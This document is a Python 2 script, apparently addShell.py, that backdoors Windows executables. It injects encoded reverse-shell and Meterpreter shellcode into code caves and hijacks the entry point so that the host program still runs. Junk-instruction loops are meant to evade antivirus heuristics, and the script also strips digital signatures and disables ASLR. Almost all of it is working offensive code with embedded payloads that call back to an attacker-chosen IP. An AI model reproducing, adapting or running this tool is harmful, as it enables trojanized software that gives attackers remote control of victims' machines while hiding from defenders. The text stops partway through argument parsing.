#!/usr/bin/python
import random, optparse, pefile, capstone, binascii, struct, os

encodingInstrHex = []	# String of hex bytes used for encoding, format feedbeef
decodingInstrHex = []	# String of hex bytes used for decoding, format feedbeef
encodingOperation = []	# Array of mathematical commands used internally to perform endcoding calclations
decodingOperation = []	# Array of mathematical commands used internally to perform decoding calclations

junkRoutine = ""
codedShell = ""

def p(x):
	return struct.pack('<L',x)


def make_writeable(pe):
	for i in pe.sections:
		i.Characteristics = 0xE0000040
	return pe


def check_64bit(pe):
	return pe.OPTIONAL_HEADER.name == "IMAGE_OPTIONAL_HEADER64"


def saveFile(pe, saveName):
	pe.write(filename=saveName)
	print "\n[*] Backdoor shell was succesfully added to file!"
	print "[*] Backdoored file written to: " + saveName


def filloutHex(hexValue):
	if len(hexValue) == 1:
		hexValue = "0" + hexValue
	return hexValue


# This will swap the Endianness for all elements in the shellcode Array, input format must be ['0x00112233', '0x44556677']
def switchEndians(shellcodeArray):
	if type(shellcodeArray) == str:
		shellcodeArray = [shellcodeArray]
	swappedShellcodeArray = []

	for word in shellcodeArray:
		word = p(eval(word))
		swappedShellcode = "0x"
		for i in word:
			formattedChar = hex(ord(i))[2:]
			if len(formattedChar) == 1:
				formattedChar = "0" + formattedChar
			swappedShellcode += formattedChar

		swappedShellcodeArray.append(swappedShellcode)

	return swappedShellcodeArray


# Converts any negative hex values or hex values larger than 256.  Input parameter must be in hex string format using hex(myInt), Returns string containing hex byte e.g. "5d"
def formatByte(hexValue):
	hexValueInt = int(hexValue,16)
	
	if hexValueInt > 255:
		hexValueInt = hexValueInt % 256

	hexValue = hex(hexValueInt)
	hexValue = hexValue[hexValue.find('x')+1:]
	hexValue = filloutHex(hexValue)

	if hexValueInt < 0:
		hexValue = hex((0xff^hexValueInt)+1)
		hexValue = hexValue[hexValue.find('x')+1:]
		hexValue = filloutHex(str(hexValue))

	return hexValue


def generateJunkInstr(numInstr, numIterations):
	global junkRoutine
	junkInstrConstHex = ['4048', '43', '4b', '41', '49', '42', '4A', '90', '6061', '9C9D', '31DB', '31C9', '31D2']
	justJunkArrayHex = []	# only contains junk instructions
	fullJunkArrayHex = []	# includes junk instructions plus setup for loops
	fullJunkArrayHex.append("31C0") # xor eax,eax to zero out eax register for junk loop
	fullJunkArrayHex.append("40")		# eax is counter for junk loop

	for i in range(numInstr):
		randValue = random.randrange(0,len(junkInstrConstHex))
		fullJunkArrayHex.append(junkInstrConstHex[randValue])
		justJunkArrayHex.append(junkInstrConstHex[randValue])

	fullJunkArrayHex.append("3D"+str(numIterations)) 			# cmp eax,numIterations
	jmpSize = len("".join(justJunkArrayHex))/2 + 8	# plus 8 is for the cmp, inc, and something else FIND OUT LATER!!!

	if jmpSize > 127:
		print "[!] Junk Routine is " + str(jmpSize) + " Bytes!! Can't use short jump instr, feature not yet implemented.\nManually add Jmp -0x" + str(jmpSize) + " Instruction"
		exit()
	else:
		jmpSize *= -1
		jmpSize = formatByte(hex(jmpSize))
		fullJunkArrayHex.append("7E" + jmpSize) 		# jmp backwards to start of junk instructions

	fullJunkArrayHex.append("90909090")					# add nops between loops for visibility
	justJunkArrayHex = []								# clear out junk instruction queue
	fullJunkArrayHex.append("48")						# eax is counter for junk loop

	for i in range(numInstr):
		randValue = random.randrange(0,len(junkInstrConstHex))
		fullJunkArrayHex.append(junkInstrConstHex[randValue])
		justJunkArrayHex.append(junkInstrConstHex[randValue])

	fullJunkArrayHex.append("83F800") 					# cmp eax,0
	jmpSize = len("".join(justJunkArrayHex))/2 + 6

	if jmpSize > 127:
		print "[!] Junk Routine is " + str(jmpSize) + " Bytes!! Can't use short jump instr, feature not yet implemented.\nPlease choose a smaller number of Junk Instructions"
		exit()
	else:
		jmpSize *= -1
		jmpSize = formatByte(hex(jmpSize))
		fullJunkArrayHex.append("7D" + jmpSize) 		# jmp backwards to start of junk instructions

	junkRoutine = "".join(fullJunkArrayHex)


def convertToArray(hexString):
	hexStringArray = []

	for i in range(len(hexString)):
		if i%2 == 0:
			hexStringArray.append(hexString[i:i+2])
	
	return hexStringArray


# Shellcode obtained from msfvenom
def generateShellcode(ip, port, payload, backdoorMode):
	if payload == 0:	
		ipArray = ip.split(".")
		ipHex = ""
		
		for i in ipArray:
			ipHexTemp = hex(int(i))[2:]
			ipHex += formatByte(ipHexTemp)

		portHex = "0"*(4-(len(hex(port))-2))+hex(port)[2:]

		if backdoorMode:
			# windows/shell_reverse_tcp EXITFUNC=none
			shellcode = "9090909090909090fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568" + ipHex + "680200" + portHex + "89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e046564eff306808871d60ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5"
		else:
			#windows/shell_reverse_tcp EXITFUNC=process
			shellcode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568" + ipHex + "680200" + portHex + "89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5"
		
		shellcode = convertToArray(shellcode)
	else:
		ipHex = ip.encode("hex")
		portHex = "0"*(4-(len(hex(port))-2))+hex(port)[2:]
		portHex = portHex[2:4]+portHex[0:2]

		if payload == 1:	# windows/meterpreter/reverse_http
			shellcode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368" + portHex + "0000e8780000002f42572d435300506857899fc6ffd589c653680002608453535357535668eb552e3bffd5966a0a5f5353535356682d06187bffd585c0750a4f75ed68f0b5a256ffd56a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c35fe889ffffff" + ipHex + "00"
		elif payload == 2:			# windows/meterpreter/reverse_http PREPENDMIGRATE=true PREPENDMIGRATEPROC=svchost.exe
			shellcode = "fce98d0000005d83c50b81c470feffff8d5424605268b14a6bb1ffd58d442460eb605e8d7860575031db5353680400000853535356536879cc3f86ffd585c0745c6a4080c710535331db53ff3768ae87923fffd5546846010000eb3c50ff3768c5d8bde7ffd55353538b4c24fc515353ff3768c6ac9a79ffd56aff6844f035e0ffd5e89bffffff737663686f73742e65786500e86effffffe8bffffffffce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368" + portHex + "0000e8780000002f3456316c3500506857899fc6ffd589c653680002608453535357535668eb552e3bffd5966a0a5f5353535356682d06187bffd585c0750a4f75ed68f0b5a256ffd56a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c35fe889ffffff" + ipHex + "00"
		elif payload == 3:		# windows/meterpreter/reverse_https PREPENDMIGRATE=false
			shellcode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368" + portHex + "0000e88c0000002f39304f6d3700506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0750a4f75d968f0b5a256ffd56a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c35fe875ffffff" + ipHex + "00"
		elif payload == 4:		# windows/meterpreter/reverse_https PREPENDMIGRATE=true PREPENDMIGRATEPROC=svchost.exe
			shellcode = "fce98d0000005d83c50b81c470feffff8d5424605268b14a6bb1ffd58d442460eb605e8d7860575031db5353680400000853535356536879cc3f86ffd585c0745c6a4080c710535331db53ff3768ae87923fffd554685a010000eb3c50ff3768c5d8bde7ffd55353538b4c24fc515353ff3768c6ac9a79ffd56aff6844f035e0ffd5e89bffffff737663686f73742e65786500e86effffffe8bffffffffce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368" + portHex + "0000e88c0000002f634c32483300506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0750a4f75d968f0b5a256ffd56a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c35fe875ffffff" + ipHex + "00"
		else:	# This should never happen
			print "[!] Invalid payload chosen"
			exit()

		if backdoorMode:
			shellcode = formatCustomShellcode(shellcode)
		else:
			shellcode = convertToArray(shellcode)

	return shellcode


# prepending shellcode was obtained from backdoor factory's "user_supplied_shellcode_threaded" method.  This allows the program to execute shellcode plus start normally
def formatCustomShellcode(buf):
	buf = binascii.unhexlify(buf)

	shellcode2 = "\xE8\xB7\xFF\xFF\xFF"
	shellcode2 += buf
	shellcode1 = "\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90\x5D\x90\xBE"
	shellcode1 += struct.pack("<I", len(shellcode2) - 5)
	shellcode1 += "\x90\x6A\x40\x90\x68\x00\x10\x00\x00\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90\x89\xF1\xeb\x44\x90\x5e\x90\x90\x90\xF2\xA4\xE8\x20\x00\x00\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5\x58\x58\x90\x61\xe9"
	shellcode1 += struct.pack("<I", len(shellcode2))

	shellcode = shellcode1 + shellcode2
	shellcode = binascii.hexlify(shellcode)
	shellcode = convertToArray(shellcode)

	return shellcode


# This method was obtained from http://www.securitysift.com/download/peCloak.py
def disable_aslr(pe):
	IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE  = 0x40 # flag indicates relocation at run time
	if (pe.OPTIONAL_HEADER.DllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):
		pe.OPTIONAL_HEADER.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
	return pe


# This method was heavily based on the DeleteDigitalSignature method in disitool.py found at http://blog.didierstevens.com/programs/disitool/
def removeSignature(pe):
	address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
	if address == 0:
		# executable is not signed
		return pe

	# Sets Digital Signature location to 0, but leaves signature intact (will be invalid if someone manually looks at it)
	pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = 0
	pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = 0

	# rewrite new pefile that doesn't contain digital signature, takes a few seconds and could be removed if time is an issue.
	if address != 0:
		peUnsignedFile = pefile.PE(data=pe.write()[0:address])
	else:
		peUnsignedFile = pefile.PE(data=pe.write())
	
	peUnsignedFile.OPTIONAL_HEADER.CheckSum = peUnsignedFile.generate_checksum()
	return peUnsignedFile
	

def generateEncoderDecoder(numSteps):
	global encodingInstrHex, decodingInstrHex, encodingOperation, decodingOperation
	randInstrHex = ["8030", "8028", "8000"]   
	randInstrOp = [" ^ ", " - ", " + "]

	for i in range(numSteps):
		randHex = hex(random.randrange(1,255))[2:]
		randHex = filloutHex(randHex)
		randHex = "0x" + randHex
		
		randOperation = random.randrange(0,len(randInstrHex))
		if randOperation == 0:
			encodingInstrHex.append(randInstrHex[randOperation]+randHex[2:])
			decodingInstrHex.append(randInstrHex[randOperation]+randHex[2:])
			encodingOperation.append(randInstrOp[randOperation]+randHex)
			decodingOperation.append(randInstrOp[randOperation]+randHex)
		elif randOperation == 1:
			encodingInstrHex.append(randInstrHex[randOperation]+randHex[2:])	# encode with add operation
			decodingInstrHex.append(randInstrHex[randOperation+1]+randHex[2:])	# decode with sub operation
			encodingOperation.append(randInstrOp[randOperation]+randHex)
			decodingOperation.append(randInstrOp[randOperation+1]+randHex)
		elif randOperation == 2:
			encodingInstrHex.append(randInstrHex[randOperation]+randHex[2:])	# encode with sub operation
			decodingInstrHex.append(randInstrHex[randOperation-1]+randHex[2:])	# decode with add operation
			encodingOperation.append(randInstrOp[randOperation]+randHex)
			decodingOperation.append(randInstrOp[randOperation-1]+randHex)
		else:
			print "[!] SOMETHING WENT TERRIBLY WRONG, UNABLE TO GENERATE ENCODING ROUTINE"

	decodingOperation.reverse()
	decodingInstrHex.reverse()
	decodingInstrHex.append('40')

	decodingInstrHex = "".join(decodingInstrHex)
	encodingInstrHex = "".join(encodingInstrHex)


def encodeShellcode(hexArray):
	global encodingOperation, codedShell
	encodedShellcodeArray = []
	
	for o in range(len(hexArray)):
		tempShellcodeByte = "0x" + str(hexArray[o])
		for i in range(len(encodingOperation)):
			toEvaluate = str(tempShellcodeByte) + str(encodingOperation[i])
			tempShellcodeByte = eval(toEvaluate)
			tempShellcodeByte = formatByte(hex(tempShellcodeByte))
			tempShellcodeByte = filloutHex(tempShellcodeByte)
			tempShellcodeByte = "0x" + tempShellcodeByte
			
		encodedShellcodeArray.append(tempShellcodeByte[2:])
		
	codedShell = "".join(encodedShellcodeArray)


# This method simply returns an array of all coce caves in the PE file that meet the minimum size requirement.  No logic is put into determine what code cave should be used
def listCaves(binFile, caveMin):
	hexDumpString = ""
	hexDumpArray = []

	# read in file and convert to string
	with open(binFile, 'rb') as f:
	    while True:
	        buf = f.read(1)
	        if not buf:
	            break

	        currentChar = hex(ord(buf))
	        currentChar = filloutHex(currentChar[2:]).upper()
	        hexDumpArray.append(currentChar)
	        hexDumpString += currentChar

	inCave = False
	caveCount = 0
	caveStart = 0
	caveStartArray = []
	caveSizeArray = []

	# search for caves
	for index,hexValue in enumerate(hexDumpArray):
		if hexValue != "00":
			if inCave == True:
				#end of cave
				if caveCount >= caveMin:
					caveStartArray.append(caveStart+1)
					caveSizeArray.append(caveCount)
					
				# reset cave values
				inCave = False
				caveCount = 0
				caveStart = 0

		if hexValue == "00":
			if inCave == False:
				#start of cave
				caveCount = 1
				caveStart = index -1
				inCave = True
			else:
				#continuing in cave
				caveCount += 1
	return caveStartArray, caveSizeArray


# returns virtual address from raw address using the formula: virtual_address = rawAddress - section.PointerToRawData + section.VirtualAddress + optional_header.imageBase
def getVirtAddr(pe, rawAddr):
	peSection = None

	for i in pe.sections:
		if (rawAddr > i.PointerToRawData) and (rawAddr < (i.PointerToRawData+i.SizeOfRawData)):
			peSection = i
			break

	virtAddr = rawAddr - peSection.PointerToRawData + peSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
	
	return virtAddr


def getSection(pe, rawAddr):
	peSection = None

	for i in pe.sections:
		if (rawAddr > i.PointerToRawData) and (rawAddr < (i.PointerToRawData+i.SizeOfRawData)):
			peSection = i
			break
	
	if peSection == None:
		print "[!] Something Strange is happening with this PE, Unable to identify PE Section of code cave."
		print "[!] Exiting now..."
		exit()

	return i


# returns an array describing the both code cave in this format [cave1StartRawAddr, cave1StartVirtAddr, cave1Size, cave2StartRawAddr, cave2StartVirtAddr, cave2Size].  Offset is a user-defined value that specifies how far into codecave shellcode should start.  Default is 4 Bytes
def findCaves(binPath, offset):
	junkCaveSize = (len(junkRoutine) + len(decodingInstrHex))/2 + 35 + offset
	shellcodeCaveSize = len(codedShell)/2 + 24 + offset
	tempPeInstance = pefile.PE(binPath)

	print "[*] Required cave space for shellcode with offset is:"
	print "\t[+] Heuristic/Decoding Routines:\t" + str(junkCaveSize) + " bytes"
	print "\t[+] Enocoded Shellcode:\t\t\t" + str(shellcodeCaveSize) + " bytes"

	# find cave for junk and decoding routines
	try:
		cave1StartRawAddrArray, cave1SizeArray = listCaves(binPath, junkCaveSize)
	except:
		print "[!] No suitable caves found, please try a smaller offset"
		exit()

	#remove caves in PE Header
	peHeaderEnd = tempPeInstance.sections[0].PointerToRawData
	tempArray = list(cave1StartRawAddrArray)	# create copy of array first so that ALL values will be looped through

	for i in tempArray:
		if i < peHeaderEnd:
			element = cave1StartRawAddrArray.index(i)
			del cave1StartRawAddrArray[element]
			del cave1SizeArray[element]
	if len(cave1StartRawAddrArray) == 0:
		print "[!] No suitable caves were found, please try a smaller offset"
		exit()

	print "\n[*] The following suitable code caves were identified:"
	print "\t[+] Virt Addr\tSize(bytes)"
	for i in range(len(cave1StartRawAddrArray)):
		print "\t    " + hex(getVirtAddr(tempPeInstance, cave1StartRawAddrArray[i])) + "\t" + str(cave1SizeArray[i])

	cave1StartRawAddrArray = [i+offset for i in cave1StartRawAddrArray]
	cave1SizeArray = [i-offset for i in cave1SizeArray]

	randCave = random.randrange(0,len(cave1StartRawAddrArray))
	cave1StartRawAddr = cave1StartRawAddrArray[randCave]
	cave1StartVirtAddr = getVirtAddr(tempPeInstance, cave1StartRawAddr)
	cave1Size = cave1SizeArray[randCave]

	print "\n[*] Randomly choosing to store heuristic/decoding routines in cave:\t" + hex(getVirtAddr(tempPeInstance, cave1StartRawAddr-offset))

	# make a copy of cave1 Arrays
	cave2StartRawAddrArray = list(cave1StartRawAddrArray)
	cave2SizeArray = list(cave1SizeArray)

	for i in cave1StartRawAddrArray:
		element = cave2StartRawAddrArray.index(i)
		if cave2SizeArray[element] < (shellcodeCaveSize - offset):
			del cave2StartRawAddrArray[element]
			del cave2SizeArray[element]
	
	if len(cave2StartRawAddrArray) == 0:
		print "[!] No suitable caves were found, please try a smaller offset"
		exit()

	try:
		# Make sure the same cave wasn't chosen
		indexCave1 = cave2StartRawAddrArray.index(cave1StartRawAddr) 
		del cave2StartRawAddrArray[indexCave1]
	except:
		#couldn't find cave1Addr in cave2 List, this is fine, but python list.index() funcion will throw an exception
		pass
	
	#remove caves in PE Header, peHeaderEnd variable was set previously
	tempArray = list(cave2StartRawAddrArray)
	
	for i in tempArray:
		if i < peHeaderEnd:
			element = cave2StartRawAddrArray.index(i)
			del cave2StartRawAddrArray[element]
			del cave2SizeArray[element]

	if len(cave2StartRawAddrArray) == 0:
		print "[!] No suitable caves were found, either try again or use a smaller offset"
		exit()

	randCave = random.randrange(0,len(cave2StartRawAddrArray))
	cave2StartRawAddr = cave2StartRawAddrArray[randCave]
	cave2StartVirtAddr = getVirtAddr(tempPeInstance, cave2StartRawAddr)
	cave2Size = cave2SizeArray[randCave]

	caveInfo = [cave1StartRawAddr, cave1StartVirtAddr, cave1Size, cave2StartRawAddr, cave2StartVirtAddr, cave2Size]
	print "[*] Randomly choosing to store encoded shellcode in cave:\t\t" + hex(getVirtAddr(tempPeInstance, cave2StartRawAddr-offset))

	return caveInfo


def fillOut4ByteHex(hexValue):
	return "0x" + "0"*(8-(len(hex(hexValue))-2))+hex(hexValue)[2:]


# This takes in 2 integers and gives you valid jmp code to get there by calcualting the relative distance.  Now works forwards and backwards
def getJmpCode(startAddrVirt, jmpAddrVirt):
	jmpRelAddr = jmpAddrVirt - startAddrVirt - 5
	if jmpRelAddr > 0:
		jmpRelAddrHex = "0x" + "0"*(8-(len(hex(jmpRelAddr))-2))+hex(jmpRelAddr)[2:]		# fill out jmpAddress to 4 byte hex value
	else:
		jmpRelAddrHex = hex(0xffffffff + jmpRelAddr + 1)	# convert negative number to proper 4byte hex value
		jmpRelAddrHex = jmpRelAddrHex.rstrip("L")
		
	jmpRelAddrArray = [jmpRelAddrHex]
	jmpRelAddrSwapped = "".join(switchEndians(jmpRelAddrArray))

	# this is the opcode used to jump to code cave 
	jmpASM =  "e9" + jmpRelAddrSwapped[2:]
	return jmpASM


def getEntryPoint(pe):
	return pe.OPTIONAL_HEADER.AddressOfEntryPoint - pe.OPTIONAL_HEADER.BaseOfCode + getSection(pe, pe.OPTIONAL_HEADER.AddressOfEntryPoint).PointerToRawData


def getEntryPointInstr(pe):
	ep_bin = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	origInstrArray = []
	offset = 0

	origInstr = pe.get_memory_mapped_image()[ep_bin:ep_bin+5+30]	# our jmp command will take up 5 bytes, extra 30 bytes is to avoid partial commands
	md = capstone.Cs(capstone.CS_ARCH_X86,capstone.CS_MODE_32)

	prevOffset = 0

	for i in md.disasm(str(origInstr), 0x0):     
		# Add last instruction to array
		if i.address != 0:
			origInstrArray.append(origInstr[prevOffset:i.address])

		# stop looping once at least 5 bytes of instructions have been preserved
		if i.address >= 5:
			break
		
		prevOffset = i.address

	return origInstrArray


# takes in PE file object, raw offset address, and code in feedbeef form
def writeCode(pe, codeStart, code):
	pe.set_bytes_at_offset(codeStart, binascii.unhexlify(code))
	return pe


def writeBackdoorCode(pe, caveInfo, origInstrArray, OSesp):
	contProgCode = ""

	backdoorCode = "609c" #pushad, pushfd
	backdoorCode += junkRoutine + "90"*8 
	
	caveInfo4 = [fillOut4ByteHex(caveInfo[4])]
	caveInfo4 = switchEndians(caveInfo4)
	caveInfo4 = caveInfo4[0][2:]
	
	backdoorCode += "b8" + caveInfo4
	backdoorCode += "90"*8 + decodingInstrHex 

	caveInfo4End = fillOut4ByteHex(caveInfo[4] + len(codedShell)/2 - 1)
	caveInfo4End = switchEndians(caveInfo4End)
	caveInfo4End = caveInfo4End[0][2:]

	backdoorCode += '3d' + caveInfo4End
	
	cmpValue = len("".join(decodingInstrHex))/2+7	# size of encoded shellcode + 7 for cmp opcode and jmp short command
	cmpValue *= -1
	cmpValue = formatByte(hex(cmpValue))

	backdoorCode += '7e' + cmpValue
	backdoorCode += getJmpCode(caveInfo[1]+len(backdoorCode)/2, caveInfo[4])

	pe = writeCode(pe, caveInfo[0], backdoorCode)
	pe = writeCode(pe, caveInfo[3], codedShell)
	pe = writeCode(pe, caveInfo[3]+len(codedShell)/2, "909090bc" + OSesp + "9d61")	#nops set ESP, popfd popad

	currentRawAddr = caveInfo[3]+len(codedShell)/2 + 10
	currentVirtAddr = caveInfo[4]+len(codedShell)/2 + 10
	preOrgInstLoopVirtAddr = currentVirtAddr
	
	entryPoint = getEntryPoint(pe)
	entryPointVirt = getVirtAddr(pe, entryPoint)

	for i in origInstrArray:
		i =  binascii.hexlify(i)

		# This will recalculate the relative value for JMP or CALL opcodes by calculating the relative jump between the current addr and (entryPointAddr+originalInstrJmp)
		if i[:2].upper() == "E9" or i[:2].upper() == "E8":
			dest = eval("0x"+i[2:])
			dest = switchEndians(hex(dest))[0]
			dest = eval(dest)
			i_rel = getJmpCode(currentVirtAddr, entryPointVirt+dest+5)	# plus 5 because we don't need to do the -5 between these addresses (-5 is done in getJmpCode method)
			i = i[:2] + i_rel[2:]

		contProgCode += i
		currentVirtAddr += len(i)/2

	preservedInstrLength = (currentVirtAddr - preOrgInstLoopVirtAddr)
	contProgCode += getJmpCode(currentVirtAddr, entryPointVirt + preservedInstrLength)
	pe = writeCode(pe, currentRawAddr, contProgCode)

	return pe


# process command line arguments and provide help output if needed
def processInputParameters():
	parser = optparse.OptionParser('usage python addShell.py [OPTIONS]\nExample: python addShell.py -f ./putty.exe -H 192.168.1.10 -P 4321')
	parser.add_option('-f', dest='file', type='string', help='Specify input PE file to backdoor')
	parser.add_option('-o', dest='output', type='string', help='Specify output location to save backdoored file.  Default=inputFile_evil.exe')
	parser.add_option('-H', dest='hostIP', type='string', help='Specify IP Address of listening Host for reverse connection, ex: 192.168.1.10')
	parser.add_option('-P', dest='port', type='int', help='Specify listening port number, ex: 4321')
	parser.add_option('-s', dest='shellcode', type='string', help='Specify custom shellcode to use, NOTE: this feature in backdoor mode adds 310 bytes to shellcode size                                            NOTE: must be in "feedbeef" hex format, recommend using the following command to properly format shellcode: msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw | xxd -p | tr -d "\n"')
	parser.add_option('-p', dest='payload', type='int', help='Specify payload.  Default shell_reverse_tcp.  Valid values are:                                                      0 - windows/shell_reverse_tcp                              1 - windows/meterpreter/reverse_http                              2 - windows/meterpreter/reverse_http +PrependMigrate                              3 - windows/meterpreter/reverse_https                              4 - windows/meterpreter/reverse_https +PrependMigrate', default=0)
	parser.add_option('-m', dest='mode', type='int', help='Specify program mode.  Program was designed to backdoor executables, but if you really need to you can disable normal program execution with the FRONTDOOR mode.         NOTE: you should really be using Veil-Evasion for this.  Valid values are (Default 0):                                   0 - BACKDOOR                                               1 - FRONTDOOR', default=0)
	parser.add_option('-t', dest='targetOS', type='int', help='Specify the target Operating System (used for preserving ESP).  Default Win7_64bit.  Valid values are:                         0 - Win7_32bit                                               1 - Win7_64bit                                                2 - Win8.1_64bit                                               3 - Win10_64bit                                        ', default=1)
	parser.add_option('-d', dest='offset', type='int', help='Specify the offset distance between shellcode and start of cave.  Recommend increasing this value if PE is crashing after shell. Default: 4', default=4)
	parser.add_option('-j', dest='num_Junk', type='int', help='Specify the number of "Junk" Instructions to use in heuristic bypass routine.  Default 30', default=30)
	parser.add_option('-J', dest='num_junk_iter', type='int', help='Specify the number of times to iterate over all "Junk" Instructions used in heuristic bypass routine.                      Default 20,000,000', default=19999998)
	parser.add_option('-e', dest='num_Encode', type='int', help='Specify number of random operations used to encode the shellcode. Default: 10, Max: 40', default=10)
	(options, args) = parser.parse_args()

	if options.file == None:
		parser.error("Must provide PE file to backdoor")
	elif os.path.exists(str(options.file)) == False:
		parser.error("input file does not exist")
	
	if options.output == None:
		indexName = options.file.rfind(".")
		if indexName == -1:
			options.output = "evil_" + str(options.file)
		else:
			options.output = str(options.file)[:indexName] + "_evil.exe" #+ str(options.file)[indexName+1:]
				
	if (options.targetOS > 3) or (options.targetOS < 0):
		parser.error("Must provide valid target OS.  Accepted Values are 0-3")
	else:
		osValueArray = ["68ff1200", "68ff1800", "60ff1800", "60ff1900"]	# byte-swapped ESP values for each OS
		options.targetOS = osValueArray[options.targetOS]

	if (options.mode > 1) or (options.mode < 0):
		parser.error("Must provide valid mode.  Accepted values are 0 and 1")
	else:
		backdoorMode = not bool(options.mode)	# True for backdoor mode, False for frontdoor mode

	if (options.payload > 4) or (options.payload < 0):
		parser.error("Must provide valid payload.  Accepted Values are 0-4")
	
	if (options.hostIP == None or options.port == None) and (options.shellcode == None):
		parser.error("Must provide either Listener IP/port or custom shellcode")
